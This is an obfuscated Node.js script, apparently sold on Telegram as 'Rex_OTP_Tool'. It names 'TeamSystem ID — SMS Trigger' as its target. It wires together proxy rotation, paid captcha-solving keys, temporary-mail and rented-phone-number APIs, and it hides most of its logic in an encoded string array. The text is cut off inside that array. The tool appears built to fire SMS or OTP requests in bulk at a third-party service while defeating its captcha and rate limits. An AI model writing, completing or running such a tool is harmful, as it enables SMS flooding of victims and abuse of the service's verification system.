const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk", "cheerio"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v14) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const v15 = {};
      v15.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4 cheerio", v15), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v16) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed."), process.exit(0x1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  cheerio = require("cheerio"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
const ANTI_CAPTCHA_KEY_FILE = path.join(__dirname, "anticaptcha_key.txt"),
  TWOCAPTCHA_KEY_FILE = path.join(__dirname, "twocaptcha_key.txt"),
  MAIL_CX_KEY_FILE = path.join(__dirname, "mailcx_key.txt");
function debugLog(v17, v18, v19) {}
const B = chalk.hex("#0057B8"),
  C = chalk.hex("#FFD700"),
  Y = chalk.hex("#00B4D8"),
  W = chalk.white;
const G = chalk.gray,
  R = chalk.hex("#FF4466"),
  DIM = chalk.hex("#555555");
function printHeader() {
  process.stdout.write("[2J[3J[H"), console.log(B("  ████████╗███████╗ █████╗ ███╗   ███╗")), console.log(B("     ██╔══╝██╔════╝██╔══██╗████╗ ████║")), console.log(C("     ██║   █████╗  ███████║██╔████╔██║"));
  console.log(C("     ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║")), console.log(Y("     ██║   ███████╗██║  ██║██║ ╚═╝ ██║\n")), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│'));
  console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│')), console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
  console.log(W("│ [•] Target    : ") + Y("TeamSystem ID — SMS Trigger  ") + W('│')), console.log(W("│ [•] Version   : ") + B("TSID-V1.0.0                  ") + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
}
class NexaRateLimiter {
  constructor(v20) {
    this.delayMs = v20;
    this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v21) {
    return new Promise((v22, v23) => {
      this.queue.push(async () => {
        try {
          v22(await v21());
        } catch (v24) {
          v23(v24);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0x0) {
      const v25 = this.queue.shift();
      await v25(), await new Promise(v26 => setTimeout(v26, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(0x1f4),
  twoOoLimiter = new NexaRateLimiter(0x1f4),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt");
const SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v27) {
  return new Promise((v28, v29) => {
    const v30 = {};
    v30.Accept = "text/plain", v30.Connection = "close";
    const v31 = {};
    v31.hostname = "smsbower.page";
    v31.port = 0x1bb, v31.path = "/stubs/handler_api.php?" + v27, v31.method = "GET", v31.headers = v30;
    const v32 = v31,
      v33 = https.request(v32, v34 => {
        let v35 = '';
        v34.on("data", v36 => v35 += v36);
        v34.on("end", () => v28(v35.trim()));
      });
    v33.on("error", v37 => v29(new Error("SmsBower net: " + v37.message))), v33.setTimeout(0x3a98, () => {
      v33.destroy();
      v29(new Error("SmsBower timeout"));
    }), v33.end();
  });
}
function smsBowerFetchNumber(v38, v39, v40, v41) {
  let v42 = "api_key=" + encodeURIComponent(v38) + "&action=getNumber&service=" + encodeURIComponent(v39 || 'fb');
  if (v40 && String(v40).trim() !== '0' && String(v40).trim() !== '') v42 += "&country=" + encodeURIComponent(v40);
  if (v41 && parseFloat(v41) > 0x0) v42 += "&maxPrice=" + encodeURIComponent(v41);
  return smsBowerRequest(v42).then(v43 => {
    if (v43.startsWith("ACCESS_NUMBER:")) {
      const v44 = v43.split(':');
      return {
        'activationId': v44[0x1],
        'phoneNumber': v44[0x2].replace(/[^0-9]/g, '')
      };
    }
    throw new Error("SmsBower: " + v43);
  });
}
const ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v45, v46) {
  return new Promise((v47, v48) => {
    const v49 = {};
    v49.range = v46, v49.is_national = false, v49.remove_plus = false;
    const v50 = JSON.stringify(v49),
      v51 = {
        'hostname': "api.zenexnetwork.com",
        'port': 0x1bb,
        'path': "/v1/getnum",
        'method': "POST",
        'headers': {
          'mapikey': v45,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v50)
        }
      };
    const v52 = https.request(v51, v53 => {
      let v54 = '';
      v53.on("data", v55 => v54 += v55);
      v53.on("end", () => {
        try {
          const v56 = JSON.parse(v54);
          if (v56?.["meta"]?.["code"] === 0xc8 && v56?.["data"]?.["full_number"]) v47(v56.data.full_number.replace(/[^0-9]/g, ''));else v48(new Error(v56?.["message"] || "Zenex: no number"));
        } catch (v57) {
          v48(new Error("Zenex: invalid JSON"));
        }
      });
    });
    v52.on("error", v58 => v48(new Error("Zenex net: " + v58.message))), v52.setTimeout(0x3a98, () => {
      v52.destroy();
      v48(new Error("Zenex timeout"));
    });
    v52.write(v50), v52.end();
  });
}
function fn1() {
  const v59 = ['drTBsW', 'Be5tyvi', 'CxbMzKu', 'icaG', 'rw9ev3K', 'DhDVy2fWDgnOyv9RzxKUDhH0', 'y0j2rha', 'Bwf1DgHHCgK', 'C3rVCa', 'A2v5CW', 'v2LSBgLHBxm', 'zxb1ueW', 'EhP0DLG', '4PscifVIGkjDifrHCMDLDcaGica6ia', 'CMv0CNK', 'CgHVBMvoDw1Izxi', 'zxjYB3i', 'C2HHmJu2', 'twLSBgvY', 'AK5stxG', 'qw9wyLe', 'rw50zxiGuhjVEgLLCYbgAwXLifbHDgG6', 'vgLTzw91Da', 'Dhj1zq', 'u21PDgG', 'Cg9YDa', 'r1r1svu', 'sMPYAem', 'zw1WDhK', 'y2f0y2G', 'DhnWDhi', 'yvj3svm', 'u05Mzwe', 'tMv4yu9uucbUzxr3B3jRoIa', 'iKDVB2DSzsbdAhjVBwuIo3y9iG', 'mKTUwxbuDW', 'zNvSBf9UDw1Izxi', 'z1fZu2C', 'yNvPBgrnAw4', 'icdILidILiaGqw50As1dyxb0y2HHieTLEsdILidILia', 'C21ZyM93zxi', 'wZqVof0Gr0vuihbYAxzHy3KGy29UC2vUDhmGCgfNzsaUlI4', 'l2fWAs92ms9UDw1IzxjZl3aZl2DLDa', 'BwfUDwfS', 'rw50zxiGy3vZDg9Tig51BwjLCIbVzIb0AhjLywrZoG', 'swzSzKG', 'zujsrhG', 'ugvVq1e', 'Bg9JyxrPB24', 'v2DhvKG', 'sfruuca', '4PYtifrOCMvHzhmGoIa', 'y29Uy2f0', '8j+uJsbbDxrVifjHBMDLiezPBMrLCIaOC2nHBIbJB25ZB2XLkq', 'vgv4Da', 'icboBYbWCM94AwvZicHKAxjLy3qP', 'r1fhvxO', 'Aw5WDxrBBMfTzt0Ix19szxf1zxn0vMvYAwzPy2f0Aw9Uvg9Rzw4Ixq', 'ntaGvgHYzwfKCYaOrMfZDcK', 'rvf5ELq', 'ywjZB3jI', 'tM8Gy29UC2vUDcbPDgvTCYbMB3vUzcbVBIbWCML2ywn5ihbHz2u', 'B0jnD08', 'u21ZqM93zxiGDgLTzw91Da', 'D3jPDgu', 'z3jLzw5cCMLNAhq', 'yMfJAW', 'CgXHDgzVCM0', 'tMfTzq', 'ugTqrwG', 'v0Xwywy', 'AhvXtLa', 'igTLEsbMB3vUzcaO', '4PscifVIGkjDief1DgHVCIaGica6ia', 'tNbdB0m', 'ywrK', 'wwvZlcb1C2uGC2f2zwqGA2v5', 'u2f2zsbRzxK/', 'q291BgqGBM90ihnJCMfWzsbdu1jgihrVA2vUigzYB20GuhjVzMLSzs9tzwn1CML0EsbWywDL', 'zxHPDa', 'DKfewNe', 'mKnHChrJAgeGy3jLyxrLvgfZAYb0Aw1LB3v0', 'BMv4yunVBMzPzW', 'ig51BwjLCNmGka', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'Dg90ywXdB3vUDa', 'CMvWBgfJzq', 'v3bfu1O', 'u3rLEcdWN5sL', 'yNL0zuXLBMD0Aa', 'BgvMrwW', '4PQHief1Dg8GzMv0y2GGzNjVBsbwB2X0EcaOmM9VosK', 'u2TPCcdIGjqGDxnLigzYzwuGzMfSBgjHy2SGkg1HAwWUDg0GlYbhDwvYCMLSBgeGtwfPBcK', 'zgvSyxLnCW', 'ChjVy2vZC2vK', 'C2vJlwnOlxvH', 'u2vJluzLDgnOlvnPDgu', 'v2LSC29U', 'tgTfvw0', 'EMHYDLe', 'icdILOJILOJILOJILOJILOJILOJILOJILOJILzFILOJILOJILOJILOJILOJILOJILOJILzCG4PAi4PAi4PAi4PAi4PAi4PwxiokwIokwIokwIokvLYaGiokwIokwIokwIokvLW', 'uMLJAgfYza', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'x19szxf1zxn0vMvYAwzPy2f0Aw9Uvg9Rzw4GBM90igzVDw5KigLUihbHz2u', 'wxnAvgy', 'zgzrz0C', 'iIWGiKnOCM9TAxvTiJT2psi', '4PYxie51BwjLCNmGzMLSzsbUB3qGzM91BMq6ia', 'vxnLCI1bz2vUDa', 'uNzPyuS', 'sM9Uzxm', 'tvjMwwu', 'vxzKz1e', 's2zPugu', 'CMvXDwvZDa', 'vw5RBM93BKnqvq', 'pt09ierfqLvhifnfu1njt04G', 'CM91BMq', 'u21ZqM93zxi6ia', 'vgvHBvn5C3rLBsbttvmGvhjPz2DLCIaGicaGica', 'xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq', 'l2DLDfrHC2Tszxn1Bhq', 'C3rHCNruAw1L', 'q291BNrYEsbJB2rLicGWid0Gyw55ksbBzgvMyxvSDdOGmf06', 'B0P4DuG', 'iokgUYbty3jHCgvYieTPBMC', 'DMvYAwz5', 'wNjbvg4', 'ihWGsfDjrdOG', 'zgLNzxn0', 'CMvWzwf0', 'C2LN', 'vw9yALy', 'zg9TywLU', 'rgvSzxrLihnHDMvKigTLEq', 'jNn0yxr1CZ0', 'z2DLCG', 'EKzsz1y', 'Bwf4', 'v3jPDguTt3v0Chv0icGOjg1NlcrJChuSjgrPC2SSjg1IksaTAM9PBIaNFcCPiG', 'l1bYB2zPBguVu2vJDxjPDhK/AgfUzgXLCJ1qAg9Uzu51BwjLCG', 'iokUNIa', 'tgLJzw5Zzwq', 's1nRrhi', 'ufDSzfy', 'EMTJEKq', 'DMvYC2LVBG', 'yNfxD1G', 'icHLlMCUidm5mZmXwfHyksbVCIaNyMfJAYC6', 'y1rUr3i', 'yM9KEv90zxH0', 'z2r2zNi', 'veP5q04', 'wMvUzxG6ig5Vig51BwjLCG', 'nJGYnJaYyuLWzvn5', 'yvzuwuC', 'CxvLDwu', 'CMvTB3zLtgLZDgvUzxi', 'rwjbq2e', 'yxbPx2TLEt0', 'svv0zuO', 'D2j6rw0', 'DK5HBuK', 'p3nPBMnLpq', 'ruT2r3O', '4PYp77Ipien1C3rVBsbgAwXLifbHDgG', 'qwnJzxb0', 'l3yXl2nVBMzPzW', 'ug9ZAxrPB24', 'suT1ExC', 'rw50zxiGBwfPBc5JEcbbueKGs2v5icH0Bv9SAxzLxY4UlIK6', 'AfnIzeW', 'C3rKB3v0', 'svroB1G', 'yxbWx2LK', 'uMf0zsbSAw1PDgvKicG0mJKP', 'pgrPDJ5qDxjZDwfUDcb0BYbHBMqGzM9YihrOzsbWDxjWB3nLCYbVzIbbCNrPy2XLCYaXmZqXigfUzcaXmZqYig9MihrOzsbjDgfSAwfUienPDMLSienVzguSieKGAgvYzwj5igv4ChjLC3nSEsbHy2nLChqGDgHLigzVBgXVD2LUzYbJBgf1C2vZig9MihrOzsa8ysbOCMvMpsjODhrWCZOVl3rJlNrLyw1ZExn0zw0Uy29Tl0nVBMrPEMLVBMLhzw5LCMfSAvrLyw1tExn0zw1jrc5WzgyIihjLBd0IBM9VCgvUzxiGBM9YzwzLCNjLCIiGDgfYz2v0psjFyMXHBMSIpKDLBMvYywWGvgvYBxmGyw5KienVBMrPDgLVBNm8l2e+oIaQpc9KAxy+', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'q2rKz0K', 'Ahjxseu', 'Bwf0y2G', 'DgHLBG', 'BM9FCgX1C19UDw1Izxi', 'C3rVCMu', 'tufmtxm', 'rg9Mvwe', 'ig51BwjLCNmUlI4', 'mKnHChrJAgeGBMv0oIa', 'vuT1DeG', 'u2vYDMvYidiGkc9WmI9NzxqP', 'cIaG4PYxienVBNnVBguGzMv0y2GGzMfPBgvKoIa', 'y2fWDgnOyvbYB3zPzgvY', 'CuLJDxy', 'iefqssblzxK6', 'cIaG4PYxienVDwXKig5VDcbNzw5LCMf0zsbiyxjKD2fYzsbjrc4GuNvUig9UifDPBMrVD3mUcG', 'AKPfrxG', 'BKXTyMe', 'ic4UlG', 'yM90Aa', 'icdILze', 'z3vLCNjPBgXHBwfPBa', 'y3LHBG', 'Dg9mB3DLCKnHC2u', 'jM1HEfbYAwnLpq', 'q1nMwhG', 'zw1HAwXFywrKCG', 'D2HhAuC', 'Eu5hDLe', 'Aw5WDxrBBMfTzt0Iq29UC2vUDhnB', 'C2v0vgLTzw91Da', 'icaO', 'sM9OBG', 'A2Lizfa', 'C3rLEf9RzxKUDhH0', 'vhj1zq', 'i0zgndq2nG', 'uMfUz2uGrMLUzgvYig1Vzgu6', 'u3DADgi', 'C29YDa', 'yxbPlJjVBZKUy2XVDwq', 'swPezey', 'rhPPquC', 'wNfYz1K', 'BwfPBc5JEdOGBM8GC3LZDgvTigrVBwfPBNmGAw4Gy29UzMLN', 'C2vJq2HvyvbSyxrMB3jT', 'y3vZDg9T', 'Bg9NAw4', 'cIaG4PYxieHxsuqGBwLZBwf0y2GGzhvYAw5Nigv4zwn1DgLVBI4GqwjVCNrPBMCUlI4k', 'C3rLEa', 'mtq4mJuWnZbtywT2uxa', 'qKfuq0GTrvjst1i', 'v0jWCKy', 'ChjVEgLLCY50Ehq', 'uu1Yrxa', 'qw50AunHChrJAgeGy3jLyxrLvgfZAYb0Aw1LB3v0', 'cIaG4PYxieLUDgvYBMfSifnLCNzLCIbfCNjVCIaOntaWks4Gvhj5igfNywLUigXHDgvYlGO', 'kcGOlISPkYKRksSK', 'CuzkDuy', 'uhjNBgC', 'DwrKwLK', 'tMv4yu9uudOGsw52ywXPzcbYzxnWB25Zzq', 'icdILztILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzC', 'DMfSDwu', 'EMvUzxG', 'BM9YBwfS', 'B1f6qLy', 'zNjVBq', 'icaGg1SZnM3INPqBwZm1Bsa', 'zgvSzxrL', 'l21LC3nHz2vZlW', 'y29UC3rYDwn0B3i', 'iIWG', 'teDMzMC', 'y3b1CW', 'C3rHDgvpyMPLy3q', 'u2vJDxjLqa', 'y291BNrYEq', 'tM8Gy2fWDgnOysbZB2X2zxiGA2v5CYbWCM92AwrLza', 'vhbHA2G', 'zxPTA3q', 'z1jLy2fWDgnOyvjLC3bVBNnL', 'B1PTquS', 'zKPbAvO', 'u2vJluzLDgnOlu1Vzgu', 'yM9KEq', 'Dgv4Df9IB2r5', 'vezODfO', 'cIaG4PYxifnLC3nPB24GAw52ywXPzgf0zwqUiev4AxrPBMCUlI4k', 'EMvUzxHdB25MAwC', 'jtvelK5HBwu9', 'tgzxC2i', 'qw50AunHChrJAgeGCg9SBcb0Aw1LB3v0', 'r3vLCNjPBgXHtwfPBcbUzxq6ia', 'BwfPBen4s2v5', 'ihjHBMDLkhmPks4UlG', 'EfnZEfq', 's2fjwuu', 'ig51BwjLCNmP', 'BNvTyMvY', 'DxnLCG', 'r2D0yLC', 'igXVy2f0Aw9Upq', 'wZCVof0Gr0vuic9qCM9MAwXLl1nLy3vYAxr5ic4UlG', 'wMvUzxGGBMv0oIa', 'wLjLtwy', 'AxnuvfK', 'BMf2AwDHDgu', 'u0vmrunuienbufrdseeGu09mvKvs', 'CMvUzgvY', 'xs5oyw1Lpq', 'wZyVof0Gv2fPDgLUzYbMB3iGDMvYAwzPy2f0Aw9UigvTywLSihzPysa', 'zw5KC1DPDgG', 'B2DVB2q', 'oIbuAw1LzcbVDxqGD2fPDgLUzYbMB3iGCMvdqvbuq0HbihnVBhv0Aw9U', 'rMnVyNm', 'BwfPBf9Pza', 'vhPVCvu', 'BKv6ANu', 'rMfPBgvKig9Uia', 'wfb1swu', 'mM9VotOGvgLTzw91Da', 'uhjLBwL1BsbmAwnLBNnLicaGicaGicaGicaGica', 'q29UC29SzsbMzxrJAcbMywLSzwq', 'qwf3EeK', 'D2HPDgu', 'C2DKy2e', 'BNbTigLUC3rHBgWGAhr0ChmTChjVEhKTywDLBNqGC29JA3mTChjVEhKTywDLBNqGy2HHBgTancbJAgvLCMLV', 'zfb1Agm', 'tfLSt0G', 'C2HPzNq', 'uNvUrgi', '4Psm4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psq', 'CgvNzuq', 'ENP4z2O', 'uKPHwxi', 'Aw5JBhvKzxm', 'sKnHsKy', '8j+tSsbttvmGqM93zxi', 'y29UC2vUDc1JB3vUDa', 'y29UDgvUDc1LBMnVzgLUzW', 'AvrIBwC', 'qwnJzxb0luvUy29KAw5N', 'icbqCM94AwvZoIa', 'u2vSzwn0ihjHBMDLCZO', 'zunXyxi', 'u01tifnLBNq', 'C3rHDhvZpq', 'y29UC2vUDc1WB3n0', 'q29UC2vUDhmLnui', 'CMv0DxjUicHMDw5JDgLVBIGPia', 'wZuVof0Gue9tvcbWCML2ywn5ignVBNnLBNrZic4UlG', 'y29UDgvUDa', 'B3DVA2O', 'qNjVD24', 'EwvZ', 'qKPbCLe', 'zw1HAwW', 'C2vJlwnOlxvHlxbSyxrMB3jT', 'zM9YBwf0', 'yuf6zem', '8j+mKcbbDxrVigzLDgnOigzYB20GtMv4yu9uucbqyw5LBa', 'vgHVBwfZ', 'iK5VDd1bp0jYyw5KiJT2psi4iG', 'C2v0lwnVB2TPzq', 'vLHUu20', 'jMzYB209DgvHBxn5C3rLBq', 'l3bYB2mVy3b1Aw5MBW', 'jtvelKf1Dg9by2nLChrHBMnLpq', 'ChjVy2vZC2LUzW', 'cIaG4Pwu4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwx', 'jg1Iid0GkeDLDc1dAw1jBNn0yw5JzsbxAw4ZmL9cyxnLqM9HCMqGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLnLCMLHBe51BwjLCJSG', 'yxbPlM1HAwWUDg0', 'ywjJzgvMz2HPAMTSBw5VChfYC3r1DND4ExOWmtiZndu2nZG5', 'icaGicdILOJILOJILztILzdILzdILz3ILOJILOJILztILzdILzdILzdILzdILz3ILOJILOJILztILzdILzdILOJILOJILzFILOJILOJILOJILOJILzCG4PAi4PAi4PAi4PAi4Pwr', 'Aw5OzxjPDa', 'rw50zxiG', 'BwLU', 'C21ZqM93zxjdB25MAwC', 'ihrHCMDLDhm', 'qKHSEuW', 'zffSB2W', 'wZeVof0Gr0vuihnPz251CcbWywDLigzVCIa', 'z2v0', 'vujvr1y', 'yvHmyMC', 'CMr5DLO', 'sfvLshe', 'ywrKCMvZCW', 'AKLduKC', 'B0LiqMi', 'BM9Uzq', 'mM9VotOGtM8GBNvTyMvY', 'EMXPyG', 'vxbSr2C', 'C2vYDMvYrw5KCg9PBNq', 'v3jewxm', 'Bg9Hza', 'iK5VDcHbo0jYyw5KiJT2psi5osi', 'DxrMoa', 'BfPoBgK', 'C2vJq2Hvyq', 'reHkwgm', 'DgLTzw91Da', 'DgfZAW', 'DhnlD3y', 'CNL5Egm', 'q1PnBwS', 'rM91BMqGC2f2zwqGqvbjieTLEsaOlI4U', 'wc1szxf1zxn0zwqTv2L0Aa', 'Dg90ywXTzw0', 'D25rrwC', 'jtvelKnOzwnRzwq9', 'BMv4Df9ZAw5Jzq', 'l2nYzwf0zvrHC2S', 'DhjPBq', 'C21ZihnLBNq', 'Aw5PDa', 'uMvTB3zLihnHDMvKigTLEq', 'tK9uifjfr0Ltvevsruq', 'BMvJy2q', 'jgrPC2SGpsaOr2v0lunPBuLUC3rHBMnLifDPBJmYx0XVz2LJywXeAxnRic1gAwX0zxiGj0rLDMLJzuLepvWNqZPCjYCGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLzVBhvTzvnLCMLHBe51BwjLCJSG', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'ntGWnti4tMvmA3nP', 'v29YA2vYia', 'A2zrAKG', 'DMfS', 'Dg9gAxHLza', 'rw50zxiGBMv3igTLEq', 'wxjzwhm', 'AMnXs00', 'ELfSD2m', 'rw50zxiGtNvTyMvYCYbgAwXLifbHDgG6', 'l2fQyxGUCgHWpW', 'CMvTB3zL', 'DhL3EKW', '8j+uPsbbDxrVigzLDgnOigzYB20Gu3rLEcaOmM9VosK', 'sg1HEhK', 'A0XowMu', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'yxbWBgLJyxrPB24VANnVBG', 'wZaVof0Gq3jLyxrPBMCGDgvTCcbLBwfPBcbPBMjVEcaUlI4', 'wMvUzxGGDgLTzw91Da', 'q05mzwy', 'mueH', 'C0zjAKW', 'y3nYzI1ZAwDUDxa', 'C21ZyM93zxjFA2v5lNr4Da', 'zeD1DLa', 'yM9Sza', 'Aw5WDxq', 'iokgKIa', 'uxryzKS', 'Bwv0Ag9K', 'uuzdEve', 'yxbPs2v5', 'C2vHCMnO', 't1Lytu0', 'BefVALq', 'rMfSC2u', 'tLviD0q', 'vcuYnKmRmq', 'DLDICfi', 'iZaWntDcoa', 'qZPCv2LUzg93C1XtExn0zw0ZmLXxAw5KB3DZug93zxjtAgvSBfX2ms4WxhbVD2vYC2HLBgWUzxHLic1oB1bYB2zPBguGlunVBw1HBMqGiG', 's0n4zxm', 'BwfPBc5JEcb0Aw1LB3v0', 'y291BNrLCG', 'tM8SigvUDgvYig5LDYbRzxK', 'wgjVyKi', 'q3jqt0q', 'DNPeEum', 'r0Xqtha', 'lM5LEgfFyxbPx2TLEq', 'we9XzvK', 'shP6wgO', 'cIaG4PYxifnLC3nPB24Gvg9Rzw4GBg9ZDc4GqwjVCNrPBMCUlI4k', 'Bg9N', 'zw4TvvmSzw47Ct0WlJK', 'icdILzeGieHxsuqGica6ia', 'EK5NBMu', 'ifnHzMfYAs81mZCUmZy', 'DLvMue8', 'ywDdu1K', 'Dgv4Da', 'g1SWBq', 'C21ZyM93zxiUCgfNzq', 'tM9dyxb0y2HHvgfZA1bYB3H5BgvZCW', 'iLDPBMrVD3mI', 'zvvdAei', 'sg93ihrVihnLBgvJDcbYyw5Nzxm/', 'vvrwuhO', 'C2v0u3rHDhvZ', 'A1D2wKe', 'C2v0uMf3tw9Kzq', 'C3rHCNrZv2L0Aa', 'y3jLyxrLsgfZAa', 'xs5jzcjD', '4QYf77IpieDViejHy2S', 'rMf0ywWGzxjYB3iGB24G', 'icaGicdILOJILOJILzeGicdILOJILOJILztILzdILzdILz0GiokwIokwIokvLokvKokvKokwIokwIokvKEkwIokwIokvKEkvMUkwIokwIokvLokvNEkwIokwIokvKq', 'icdILzeGicdINjCGvu5bvvrit1jjwKveieHbuKrxqvjfiokaLcbuu0Leifrpt0WGicaGicaG4Pwr', 'l2v0yY9TywnOAw5LlwLK', 'CgDMEgi', 'Ahr0Chm', 'u0XSvKS', 'vgvHBvn5C3rLBsbjrcdIGjqGu01tifrYAwDNzxiGia', 'sM9ZzxbO', 'q29UC29Szsb0Aw1LB3v0', 'uNH4y2m', 'oI8V', 'zuPHsg0', 'qw50AunHChrJAge6ieLUDMfSAwqGsLnptG', 'twTUAuK', 'BM93', 'zgzNDeC', 'BNvTyMvYC0zPBgu', 'l2fJy291BNrZ', 'BwfPBc50BtOGzMfPBgvKihrVigDLDcbHDxrOihrVA2vU', 'icdILiiGia', 'icaJicaGuMfUz2uGicaGicaGicaGicaGieHPDhm', 'z3PPCa', 'C3vJy2vZC2z1Bc50Ehq', '4PQHifPLBMv4', 'u2vYDMLJzsbJB2rLicHLlMCUigzIlcbPzYKGw2rLzMf1Bhq6igzIxtO', 'yxbWzw5KrMLSzvn5BMm', 'r0vu', 'zw1HAwWTDMvYAwz5', 'BwfPBhrT', 'we1mshr0CfjLCxvLC3q', 'zxHWAxjLza', 'q0TNEw0', 'CNnUCNa', 'u0vmrunuie5vtujfuIbtt1vsq0u', 'jg1Nid0GkeDLDc1jDgvTuhjVCgvYDhKGj0Hlte06xfnprLrxqvjfxe1Py3jVC29MDfXdCNLWDg9NCMfWAhKNic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLks5nywnOAw5Lr3vPzdSG', 'yMfUBMvK', 're95r3G', 'y2HHBgS', 'DgfgDvK', 'mKnHChrJAgeGCg9SBdOG', 'BMfTzq', '8j+tIIbtAg93ihrVCca1icyGC2vSzwn0', 'C29JA3m1', 'thzewvK', 'l3yXl2DLDg51Bq', 'y2fWDgnOys10B2TLBG', 'zw1HAwXZ', 'BhzAwLi', 'swTSqvm', 'A0vPtuC', 'qw50AunHChrJAge', 'CMvHzhK', 'uMvMzxjLCG', 'iZaWqZLbnW', 'sM9OBNnVBG', 'xs5qB3nPDgLVBJ0', 'C2XPy2u', 'tenoqKq', 'quHbDKW', 'CMfUzg9TqNL0zxm', 'mMnHChrJAge', 'Au5yy2e', 'A2PJvLy', 'vg90ywWGvgLTzq', 'vK5Iueu', 'DhDVt29dB25MAwC', 'r3zbwuC', 'uwXHv0K', 'Ee5XELm', 'rw50zxiGwMvUzxGGqvbjieTLEsaOBwfWAwTLEsK6', 'BMv4yw90ChnLCNzPy2uUy29T', 'DfPZwha', 'wMzuyum', 'tM8GAgfYzhDHCMuGzgf0yq', 'vhjPz2DLCMvKie9uucbMB3iG', 'yxbWBhK', 'xs5ezwzHDwX0vMfSDwu9', 'DhnPza', 'l21LC3nHz2vZp3bHz2u9mq', 'yxbPlM1HAwWUy3G', 'iK5VDc9bkujYyw5KiJT2psiYnci', 'yMPlDLe', 'C2TPCa', 'C3bSAwnL', 'DxnLCKfNzw50', 'CMv0DxjU', 'xsdINjCGsw5ZDwzMAwnPzw50igjHBgfUy2uUcG', 'yNvPBgrnyxG', 'C2Xdu3e', 'xs5szxf1AxjLzd0', 'C2LNBNvWlxbVC3q', 'yw50AwnHChrJAge', 'g1SYsHTBsa', 'cLTtrvrvuf0GrMLYC3qGDgLTzsbZzxr1CdOGsw5ZDgfSBgLUzYbYzxf1AxjLzcbKzxbLBMrLBMnPzxmUlI4', 'AhrTBf9IB2r5', 'jtvelKnOzwnRzwq9zMfSC2u', 'zuTttu0', 'g1SYsW0k', 'zgvIDwCUDhH0', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'AvbbC1C', 'DgfZA0LK', 'C3rYAw5NAwz5', 'u0vmrunuifriuKvbrfm', 'r2XtvKu', 'u2LNBNvWifbpu1qGCMv0DxjUzwqGsfruuca', 'y2HvAMq', 'B3jPz2LUywW', 'BwfPBgn4lwvTywLSlwTLExm', 'EefjCxG', 'l2rVBwfPBNm/CgfNzt0X', 'zgf0yq', 'CMvK', 'x19szxf1zxn0vMvYAwzPy2f0Aw9Uvg9Rzw49', 'swLqEuK', 'DMvYAwz5lwXPBMS', 